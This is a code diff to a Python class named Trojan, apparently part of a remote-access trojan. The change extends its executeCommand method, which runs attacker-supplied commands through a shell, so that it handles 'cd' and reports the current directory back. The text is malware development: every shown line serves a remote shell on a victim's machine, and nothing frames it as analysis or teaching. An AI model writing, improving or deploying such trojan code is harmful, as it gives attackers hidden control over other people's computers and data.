@@ -5,7 +5,7 @@ import subprocess
 from time import sleep
 from tempfile import gettempdir
 from os.path import basename, join, abspath
-from os import devnull, chdir
+from os import chdir, getcwd
 import sys
 from shutil import copy2
 import payloads
@@ -99,11 +99,18 @@ class Trojan:
 
     def executeCommand(self, command):
         try:
-            # Check if the command is 'cd ..'
             if command.strip() == 'cd ..':
                 # Change the working directory one level up
                 chdir('..')
-                return ""
+                return f"[Changed to parent directory] : {getcwd()}"
+
+            if command.startswith('cd '):
+                # Extract the directory path from the command
+                dir_path = command.split(" ", 1)[1]
+                # Change the working directory to the specified path
+                chdir(dir_path)
+                return f"[Changed to directory] : {getcwd()}"
+
             process = subprocess.Popen(
                 command,
                 shell=True,
